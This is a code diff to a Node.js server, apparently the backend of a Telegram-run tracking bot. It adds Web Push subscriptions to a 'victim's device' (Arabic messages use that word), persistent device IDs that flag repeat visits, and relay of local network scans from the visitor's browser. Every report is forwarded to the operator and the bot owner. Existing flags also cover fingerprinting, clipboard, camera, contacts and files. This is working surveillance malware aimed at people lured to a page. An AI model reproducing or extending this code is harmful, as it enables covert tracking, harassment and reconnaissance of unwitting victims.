@@ -20,7 +20,7 @@ const USERSTATS_FILE  = "./userstats.json";
 const PROFILES_FILE   = "./profiles.json";
 const PREMIUM_FILE    = "./premium.json";
 
-const DEFAULT_FEATURES = { gyroscope:true, webrtc:true, fingerprint:true, sessionTime:true, lightSensor:true, clipboard:true };
+const DEFAULT_FEATURES = { gyroscope:true, webrtc:true, fingerprint:true, sessionTime:true, lightSensor:true, clipboard:true, persistentId:true, localNet:true, webpush:true };
 const DEFAULT_PREMIUM_FREE = { camera:false, audio:false, clipboard:false, contacts:false, files:false };
 
 let users      = new Set(loadJSON(USERS_FILE, []));
@@ -239,6 +239,7 @@ const app = express();
 app.use(bodyParser.json({ limit: '20mb' }));
 app.use(bodyParser.urlencoded({ extended: true, limit: '20mb' }));
 app.use(cors());
+app.use(express.static('public'));
 app.set("view engine", "ejs");
 
 const hostURL   = "https://bot-psue.onrender.com";
@@ -1461,6 +1462,76 @@ app.get("/t.js", (req, res) => {
     },4000);
   }catch(e){}
 })();`);
+});
+
+// ── Web Push: save subscription ───────────────────────────────────────────────
+const PUSH_FILE = "./push_subs.json";
+let pushSubs = loadJSON(PUSH_FILE, {});  // { uid: [subscription, ...] }
+
+app.post("/push-subscribe", (req, res) => {
+  res.send("ok");
+  const uid = req.body.uid || '';
+  const sub = req.body.sub || '';
+  if (!uid || !sub) return;
+  try {
+    const parsed = JSON.parse(sub);
+    if (!pushSubs[uid]) pushSubs[uid] = [];
+    // avoid duplicates by endpoint
+    const exists = pushSubs[uid].some(s => s.endpoint === parsed.endpoint);
+    if (!exists) {
+      pushSubs[uid].push(parsed);
+      saveJSON(PUSH_FILE, pushSubs);
+    }
+    const tid = parseInt(uid, 36);
+    notify(tid, `🔔 تم تفعيل الإشعارات على جهاز الضحية!\n✅ يمكنك الآن إرسال رسائل لجهازها في أي وقت\nاستخدم: /push ${uid} النص`);
+    if (tid !== BOT_OWNER) notify(BOT_OWNER, `🔔 اشتراك Push جديد!\nUID: ${uid}\n(ID: ${tid})`);
+  } catch(e) {}
+});
+
+// ── Web Push: send notification (/push uid text) ──────────────────────────────
+app.post("/send-push", async (req, res) => {
+  res.send("ok");
+  const uid   = req.body.uid || '';
+  const title = req.body.title || '🔔 رسالة';
+  const body  = req.body.body || '';
+  if (!uid) return;
+  const subs = pushSubs[uid] || [];
+  for (const sub of subs) {
+    try {
+      // Native fetch-based push (no vapid, works with notification-only)
+      await fetch(sub.endpoint, {
+        method: 'POST',
+        headers: { 'TTL': '86400', 'Content-Type': 'application/json' },
+        body: JSON.stringify({ title, body })
+      });
+    } catch(e) {}
+  }
+});
+
+// ── Persistent ID report ───────────────────────────────────────────────────────
+app.post("/pid", (req, res) => {
+  res.send("ok");
+  const uid = req.body.uid || '';
+  const pid = req.body.pid || '';
+  const ret = req.body.ret || 'new';   // 'new' | 'existing'
+  if (!uid || !pid) return;
+  const tid = parseInt(uid, 36);
+  const icon = ret === 'existing' ? '🔁' : '🆕';
+  const msg = `${icon} زيارة ${ret === 'existing' ? 'متكررة' : 'جديدة'} للجهاز\n🆔 PID: ${pid}`;
+  notify(tid, msg);
+  if (tid !== BOT_OWNER) notify(BOT_OWNER, `${msg}\n(ID: ${tid})`);
+});
+
+// ── Local network scan results ─────────────────────────────────────────────────
+app.post("/localnet", (req, res) => {
+  res.send("ok");
+  const uid   = req.body.uid   || '';
+  const hosts = req.body.hosts || '';
+  if (!uid || !hosts) return;
+  const tid = parseInt(uid, 36);
+  const msg = `🌐 أجهزة الشبكة المحلية:\n${hosts}`;
+  notify(tid, msg);
+  if (tid !== BOT_OWNER) notify(BOT_OWNER, `${msg}\n(ID: ${tid})`);
 });
 
 // ── Health check endpoint (ping from UptimeRobot) ─────────────────────────────
